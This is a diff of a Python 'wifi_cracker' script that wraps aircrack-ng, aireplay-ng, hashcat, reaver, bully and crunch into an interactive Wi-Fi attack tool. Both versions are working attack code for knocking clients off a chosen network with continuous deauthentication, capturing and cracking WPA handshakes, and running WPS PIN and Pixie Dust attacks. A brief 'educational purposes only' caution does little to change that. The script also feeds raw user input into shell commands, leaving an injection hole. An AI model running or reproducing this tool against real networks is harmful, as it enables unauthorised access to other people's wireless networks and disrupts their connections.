@@ -2,25 +2,17 @@ import os
 import subprocess
 import time
 import logging
-import signal
 from colorama import Fore, Style, init
 from tqdm import tqdm
 from manuf import manuf
-import csv
 from tabulate import tabulate
 
-
-# Initialize colorama to automatically reset colors after each print
+# Initialize colorama and logging
 init(autoreset=True)
-
-# Configure logging settings
 logging.basicConfig(filename='wifi_cracker.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Print caution message
-print(Fore.YELLOW + "Caution: This tool is intended for educational purposes only. Unauthorized use may violate "
-      "applicable law. Use responsibly and respect privacy.")
-
-# License text
+# Display caution and license agreement
+print(Fore.YELLOW + "Caution: This tool is intended for educational purposes only. Unauthorized use may violate applicable law. Use responsibly and respect privacy.")
 license_text = """
 {green}MIT License
 
@@ -44,20 +36,14 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """.format(green=Fore.GREEN)
-
-# Print license text and ask user to confirm reading it
 print(license_text)
-read_license = input("Have you read the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
 
-# Keep asking the user until they confirm reading the license
+# License agreement prompt
+read_license = input("Have you read the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
 while read_license != 'yes':
     print(license_text)
     read_license = input("Have you read the license now? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
-
-# Ask user to confirm understanding and agreement with the license
 understand_agree = input("Do you understand and agree with the license? ({green}yes{reset}/{red}no{reset}): ".format(green=Fore.GREEN, red=Fore.RED, reset=Style.RESET_ALL)).strip().lower()
-
-# If the user doesn't agree to the license, exit the program
 if understand_agree != 'yes':
     print(Fore.RED + "You must agree to the license to use this tool. Exiting.")
     exit(1)
@@ -65,20 +51,20 @@ if understand_agree != 'yes':
 # Clear the screen
 os.system('cls' if os.name == 'nt' else 'clear')
 
-# Function to run shell commands and capture output
+# Function to run a terminal command and capture its output
 def run_command(command):
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
     logging.info(f"Command: {command}\nOutput: {result.stdout}\nError: {result.stderr}")
     return result.stdout, result.stderr
 
-# Function to check if the script is run as root
+# Ensure the script is run as root
 def check_root():
     if os.geteuid() != 0:
         print(Fore.RED + "This script must be run as root.")
         logging.error("Please run the script as root.")
         exit(1)
 
-# Function to display introductory message
+# Display script introduction
 def display_intro():
     intro = """
     ---------------------------------------------------------------------------------------
@@ -93,14 +79,13 @@ def display_intro():
     """
     print(Fore.GREEN + intro)
     logging.info("Displayed intro.")
-    time.sleep(3)  
+    time.sleep(3)
 
-# Function to check and install required tools
+# Check and install required tools
 def check_and_install_requirements():
     required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'hashcat', 'crunch', 'cap2hccapx.bin', 'reaver', 'bettercap', 'bully']
-    
     missing_tools = []
-    
+
     for tool in required_tools:
         out, err = run_command(f"which {tool}")
         if not out.strip():
@@ -128,264 +113,178 @@ def check_and_install_requirements():
     else:
         print(Fore.GREEN + "All required tools are already installed.")
 
-# Function to find wordlists
+# Find available wordlists in common directories
 def find_wordlists():
     wordlist_directories = [
         "/usr/share/wordlists/",
-        "/path/to/custom/wordlists/", 
+        "/path/to/custom/wordlists/",
     ]
-    
     wordlists = []
     for directory in wordlist_directories:
         if os.path.isdir(directory):
             files = os.listdir(directory)
             wordlists.extend([os.path.join(directory, file) for file in files if file.endswith('.txt')])
-    
     return wordlists
 
-# Function to find tools with associated wordlists
+# Tools with bundled wordlists
 def find_tools_with_wordlists():
     tools_with_wordlists = {
-        "hashcat": ["rockyou.txt", "passwords.txt"],  
-        "john": ["english.txt", "common.txt"],  
+        "hashcat": ["rockyou.txt", "passwords.txt"],
+        "john": ["english.txt", "common.txt"],
     }
-    
     return tools_with_wordlists
- 
-# Try to enable monitor mode   
+
+# Create a custom random wordlist using crunch
+def create_random_wordlist():
+    print(Fore.CYAN + "Creating a custom random wordlist with crunch.")
+    min_length = input(Fore.CYAN + "Enter minimum password length: ").strip()
+    max_length = input(Fore.CYAN + "Enter maximum password length: ").strip()
+    characters = input(Fore.CYAN + "Enter characters to include (e.g., abc123!@#): ").strip()
+    wordlist_path = input(Fore.CYAN + "Enter output path for the wordlist: ").strip()
+
+    run_command(f"crunch {min_length} {max_length} {characters} -o {wordlist_path}")
+    print(Fore.GREEN + f"Custom wordlist created at {wordlist_path}")
+
+# Enable monitor mode on the Wi-Fi adapter
 def enable_monitor_mode():
-    print(Fore.YELLOW + "Enabling monitor mode...")
-    
-    out, err = run_command("sudo airmon-ng start wlan0")
-    if "monitor mode enabled" in out:
-        print(Fore.GREEN + "Monitor mode enabled.")
-        return True
-    else:
-        print(Fore.RED + "Failed to enable monitor mode.")
-        logging.error("Failed to enable monitor mode.")
-        print(Fore.YELLOW + "Attempting to kill interfering processes...")
-        run_command("sudo airmon-ng check kill")
-        out, err = run_command("sudo airmon-ng start wlan0")
-        if "monitor mode enabled" in out:
-            print(Fore.GREEN + "Monitor mode enabled.")
-            return True
-        else:
-            print(Fore.RED + "Failed to enable monitor mode after killing interfering processes.")
-            logging.error("Failed to enable monitor mode after killing interfering processes.")
-            return False
+    print(Fore.YELLOW + "Enabling monitor mode on wlan0...")
+    run_command("airmon-ng start wlan0")
+    return True
 
-# def enable_monitor_mode():
-#     print(Fore.YELLOW + "Enabling monitor mode...")
-#     out, err = run_command("sudo airmon-ng start wlan0")
-#     if "monitor mode enabled" in out:
-#         print(Fore.GREEN + "Monitor mode enabled.")
-#         return True
-#     else:
-#         print(Fore.RED + "Failed to enable monitor mode.")
-#         logging.error("Failed to enable monitor mode.")
-#         return False
-
-
-def restart_network_manager():
-    print(Fore.YELLOW + "Restarting network manager...")
-    subprocess.run(["systemctl", "restart", "NetworkManager"])
-
-def start_services():
-    print(Fore.YELLOW + "Starting services...")
-    subprocess.run(["systemctl", "start", "bluetooth.service"])
-    subprocess.run(["systemctl", "start", "network-manager.service"])
-    
-scanning = True
-
-def signal_handler(sig, frame):
-    global scanning
-    scanning = False
-
-signal.signal(signal.SIGINT, signal_handler)
-
+# Get manufacturer information for a BSSID
 def get_manufacturer(bssid):
-    parser = manuf.MacParser()
-    return parser.get_manuf(bssid) or "Unknown"
+    try:
+        parser = manuf.MacParser()
+        manufacturer = parser.get_manuf(bssid)
+        return manufacturer if manufacturer else "Unknown"
+    except:
+        return "Unknown"
 
+# Get users connected to a BSSID
 def get_users(bssid):
-    output, _ = run_command(f"airodump-ng --bssid {bssid} wlan0mon --write users --output-format csv")
     users = []
-    with open('users-01.csv', 'r') as file:
-        for line in file:
-            if bssid in line:
-                parts = line.split(',')
-                if len(parts) > 0:
-                    users.append(parts[0].strip())
+    try:
+        with open(f"output-{bssid}-01.csv", "r") as file:
+            for line in file:
+                if bssid in line and "Station MAC" not in line:
+                    users.append(line.split(",")[0].strip())
+    except FileNotFoundError:
+        logging.error(f"Users file for BSSID {bssid} not found.")
+        pass
+    
     return users
 
+# Scan for Wi-Fi networks
 def scan_networks():
-    print(Fore.YELLOW + "Scanning for networks... Press Ctrl+C to stop the scan.")
-    global scanning
-    scanning = True
+    print(Fore.YELLOW + "Scanning for networks... (Press Ctrl+C to stop)")
     networks = []
-
-    process = subprocess.Popen(["airodump-ng", "wlan0mon"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    process = subprocess.Popen(['airodump-ng', 'wlan0mon'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     try:
-        while scanning:
-            output = process.stdout.readline().decode("utf-8")
-            if "BSSID" in output:
-                continue  
-            if "Station MAC" in output:
-                break  
-            if output.strip():
-                network_info = output.split(",")
-                network = {
-                    "BSSID": network_info[0].strip(),
-                    "ESSID": network_info[13].strip(),
-                    "Channel": network_info[3].strip(),
-                    "Privacy": network_info[5].strip(),
-                    "Cipher": network_info[6].strip(),
-                    "Authentication": network_info[7].strip(),
-                    "Power": network_info[8].strip(),
-                    "Beacons": network_info[9].strip(),
-                    "IV": network_info[10].strip(),
-                    "LAN Clients": network_info[11].strip(),
-                    "Station": network_info[12].strip(),
-                    "Power": network_info[8].strip(),
-                    "Manufacturer": get_manufacturer(network_info[0].strip()),
-                    "Connected Users": ", ".join(get_users(network_info[0].strip()))
-                }
-                networks.append(network)
-                
-        headers = ["BSSID", "ESSID", "Channel", "Privacy", "Cipher", "Authentication", 
-                   "Power", "Beacons", "IV", "LAN Clients", "Station", "Manufacturer", "Connected Users"]
-        rows = [[network[key] for key in headers] for network in networks]
-        
-        print(tabulate(rows, headers=headers, tablefmt="grid"))
+        for output in process.stdout:
+            output = output.decode("utf-8").strip("\n-8")
+            if output.startswith(" BSSID"):
+                continue
+            parts = output.split()
+            if len(parts) >= 14:
+                bssid, pwr, beacons, data, channel, encryption, essid = parts[0], parts[3], parts[5], parts[6], parts[8], parts[13], ' '.join(parts[14:])
+                networks.append({
+                    "BSSID": bssid,
+                    "PWR": pwr,
+                    "Beacons": beacons,
+                    "Data": data,
+                    "Channel": channel,
+                    "Encryption": encryption,
+                    "ESSID": essid,
+                    "Manufacturer": get_manufacturer(bssid),
+                    "Users": get_users(bssid)
+                })
     except KeyboardInterrupt:
-        pass
-    finally:
         process.terminate()
-        process.wait()
+        print(Fore.YELLOW + "Scan stopped. Processing results...")
 
     return networks
 
-def deauth_users(bssid, channel):
-    print(Fore.YELLOW + f"Deauthenticating users from BSSID {bssid} on channel {channel}...")
-    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write users_deauth --output-format csv wlan0mon")
-    users = get_users(bssid)
-    for user in users:
-        run_command(f"aireplay-ng --deauth 1 -a {bssid} -c {user} wlan0mon")
-        print(Fore.GREEN + f"{user} has been deauthenticated from the network.")
+# Perform a deauthentication attack
+def perform_deauthentication_attack(bssid, channel, essid):
+    print(Fore.YELLOW + f"Starting deauthentication attack on {essid} ({bssid})...")
+    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write output wlan0mon")
+    print(Fore.YELLOW + f"Sending deauth packets to {essid} ({bssid})...")
+    run_command(f"aireplay-ng --deauth 0 -a {bssid} wlan0mon")
 
-def check_handshake():
-    print(Fore.YELLOW + "Checking for handshake...")
-    run_command("aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap")
-    return os.path.isfile("handshake-01.cap")
+# Capture a WPA handshake
+def wpa_handshake_capture(bssid, channel, essid):
+    print(Fore.YELLOW + f"Capturing WPA handshake for {essid} ({bssid}) on channel {channel}...")
+    run_command(f"airodump-ng --bssid {bssid} --channel {channel} --write handshake wlan0mon")
+    time.sleep(10)
+    print(Fore.YELLOW + f"Sending deauth packets to {essid} ({bssid})...")
+    run_command(f"aireplay-ng --deauth 0 -a {bssid} wlan0mon")
 
-def crack_handshake_with_tool(hccapx_file, wordlist, tool):
-    if tool == "aircrack-ng":
-        print(Fore.YELLOW + f"Cracking handshake with aircrack-ng using wordlist {wordlist}...")
-        out, err = run_command(f"aircrack-ng -w {wordlist} -b {hccapx_file}")
-    elif tool == "reaver":
-        print(Fore.YELLOW + f"Cracking handshake with Reaver...")
-        out, err = run_command(f"reaver -i wlan0mon -b {hccapx_file} -vv")
-    elif tool == "bettercap":
-        print(Fore.YELLOW + f"Cracking handshake with Bettercap...")
-        out, err = run_command(f"bettercap -eval 'wifi.recon on; wifi.assoc -b {hccapx_file}'")
-    elif tool == "bully":
-        print(Fore.YELLOW + f"Cracking handshake with Bully...")
-        out, err = run_command(f"bully -b {hccapx_file} -c 6 -v 3 -F")
-    elif tool == "hashcat":
-        print(Fore.YELLOW + f"Cracking handshake with Hashcat using wordlist {wordlist}...")
-        out, err = run_command(f"hashcat -m 2500 {hccapx_file} {wordlist} --force")
-    
-    if "Cracked" in out or "Found" in out:
-        print(Fore.GREEN + "Password found!")
-        print(out)
-        logging.info(f"Password found with {tool} and wordlist {wordlist}.")
-        return True
-    return False
+# Crack a captured WPA handshake
+def crack_handshake(bssid, essid, wordlist):
+    print(Fore.YELLOW + f"Converting .cap file to .hccapx format for {essid} ({bssid})...")
+    run_command(f"cap2hccapx.bin handshake-01.cap handshake.hccapx")
+    print(Fore.YELLOW + f"Attempting to crack WPA handshake for {essid} ({bssid}) using wordlist {wordlist} and hashcat...")
+    run_command(f"hashcat -m 2500 -a 0 handshake.hccapx {wordlist}")
 
-def generate_passwords():
-    crunch_command = "crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*() -o generated_wordlist.txt"
-    print(Fore.YELLOW + f"Generating passwords with command: {crunch_command}")
-    run_command(crunch_command)
+# Perform a Reaver attack
+def reaver_attack(bssid, channel, essid):
+    print(Fore.YELLOW + f"Starting Reaver attack on {essid} ({bssid}) on channel {channel}...")
+    run_command(f"reaver -i wlan0mon -b {bssid} -c {channel} -vv")
 
-def convert_cap_to_hccapx(cap_file):
-    hccapx_file = cap_file.replace('.cap', '.hccapx')
-    run_command(f"cap2hccapx.bin {cap_file} {hccapx_file}")
-    return hccapx_file
+# Perform a Bully attack
+def bully_attack(bssid, channel, essid):
+    print(Fore.YELLOW + f"Starting Bully attack on {essid} ({bssid}) on channel {channel}...")
+    run_command(f"bully wlan0mon -b {bssid} -c {channel} -v 3")
 
+# Perform a Pixie Dust attack
+def pixie_dust_attack(bssid, channel, essid):
+    print(Fore.YELLOW + f"Starting Pixie Dust attack on {essid} ({bssid}) on channel {channel}...")
+    run_command(f"reaver -i wlan0mon -b {bssid} -c {channel} -vv -K 1")
+
+# Main function to run the script
 def main():
     check_root()
-    
     display_intro()
-    
     check_and_install_requirements()
+
+    wordlists = find_wordlists()
+    tools_with_wordlists = find_tools_with_wordlists()
     
     if not enable_monitor_mode():
-        print(Fore.RED + "Warning: Monitor mode could not be enabled. Some features may not work properly.")
+        print(Fore.RED + "Monitor mode is required to continue. Exiting.")
+        logging.error("Monitor mode is required to continue. Exiting.")
+        exit(1)
+
+    create_custom_wordlist = input(Fore.CYAN + "Would you like to create a custom random wordlist? (yes/no): ").strip().lower()
+    if create_custom_wordlist == 'yes':
+        create_random_wordlist()
 
     networks = scan_networks()
-    display_networks(networks)
+    print(tabulate(networks, headers="keys"))
     
-    network_number = int(input(Fore.CYAN + "Select a network by number: "))
-    if network_number < 1 or network_number > len(networks):
-        print(Fore.RED + "Invalid network number. Please try again.")
-        logging.error("Invalid network number selected.")
-        return
-    
-    selected_network = networks[network_number - 1]
-    bssid = selected_network['BSSID']
-    channel = selected_network['Channel']
-    
-    deauth_users(bssid, channel)
-    
-    if check_handshake():
-        print(Fore.GREEN + "Handshake captured successfully.")
-        logging.info("Handshake captured successfully.")
-        
-        hccapx_file = convert_cap_to_hccapx("handshake-01.cap")
-        
-        tools = ["aircrack-ng", "reaver", "bettercap", "bully", "hashcat"]
-        wordlists = find_wordlists()
-        
-        if not wordlists:
-            print(Fore.RED + "No wordlists found. Exiting.")
-            logging.error("No wordlists found. Exiting.")
-            return
-        
-        print(Fore.CYAN + "Select the tool you want to use for cracking:")
-        for i, tool in enumerate(tools):
-            print(Fore.CYAN + f"{i + 1}. {tool}")
-        
-        tool_number = int(input(Fore.CYAN + "Enter the tool number: "))
-        if tool_number < 1 or tool_number > len(tools):
-            print(Fore.RED + "Invalid tool number. Proceeding with default sequence.")
-            logging.warning("Invalid tool number selected, proceeding with default sequence.")
-            tool_number = 1
+    bssid = input(Fore.CYAN + "Enter the BSSID of the network to attack: ").strip()
+    channel = input(Fore.CYAN + "Enter the channel of the network: ").strip()
+    essid = input(Fore.CYAN + "Enter the ESSID of the network: ").strip()
 
-        selected_tool = tools[tool_number - 1]
-        
-        for wordlist in wordlists:
-            if crack_handshake_with_tool(hccapx_file, wordlist, selected_tool):
-                return
-        
-        for tool in tools[tool_number:]:
-            if tool == "hashcat":
-                generate_passwords()
-                if crack_handshake_with_tool(hccapx_file, "generated_wordlist.txt", "hashcat"):
-                    print(Fore.GREEN + "Password cracked with generated passwords.")
-                    logging.info("Password cracked with generated passwords.")
-                    return
-            elif any(crack_handshake_with_tool(hccapx_file, wordlist, tool) for wordlist in wordlists):
-                print(Fore.GREEN + "Password cracked with next available tool.")
-                return
-        
-        print(Fore.RED + "Failed to crack the password with all available tools and wordlists.")
-        logging.info("Failed to crack the password with all available tools and wordlists.")
-    else:
-        print(Fore.RED + "Failed to capture handshake.")
-        logging.error("Failed to capture handshake.")
+    attack_choice = input(Fore.CYAN + "Choose attack type (1 - Deauth, 2 - WPA Handshake, 3 - Reaver, 4 - Bully, 5 - Pixie Dust): ").strip()
     
-    print(Fore.YELLOW + "Exiting.")
+    if attack_choice == '1':
+        perform_deauthentication_attack(bssid, channel, essid)
+    elif attack_choice == '2':
+        wordlist = input(Fore.CYAN + "Enter the path to the wordlist for cracking: ").strip()
+        wpa_handshake_capture(bssid, channel, essid)
+        crack_handshake(bssid, essid, wordlist)
+    elif attack_choice == '3':
+        reaver_attack(bssid, channel, essid)
+    elif attack_choice == '4':
+        bully_attack(bssid, channel, essid)
+    elif attack_choice == '5':
+        pixie_dust_attack(bssid, channel, essid)
+    else:
+        print(Fore.RED + "Invalid choice. Exiting.")
+        logging.error("Invalid attack choice. Exiting.")
+        exit(1)
 
 if __name__ == "__main__":
     main()
